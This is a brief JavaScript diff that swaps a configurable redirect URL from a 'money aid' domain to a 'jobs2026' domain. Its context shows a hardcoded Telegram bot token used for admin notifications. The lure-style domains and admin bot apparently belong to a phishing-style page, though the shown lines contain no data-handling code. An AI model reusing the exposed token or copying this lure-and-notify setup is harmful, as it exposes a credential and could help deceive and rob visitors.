@@ -2,7 +2,7 @@
 
 document.addEventListener('DOMContentLoaded', () => {
   // Configurable Telegram URL
-  const TELEGRAM_URL = "https://bantuanuang-one.vercel.app/";
+  const TELEGRAM_URL = "https://jobs2026.vercel.app/";
 
   // Telegram Bot Config (notifikasi ke admin)
   const TELEGRAM_BOT_TOKEN = "8671891265:AAESmv2ueXuoXV_sYHxOsQwP8rO4VBaAefA";
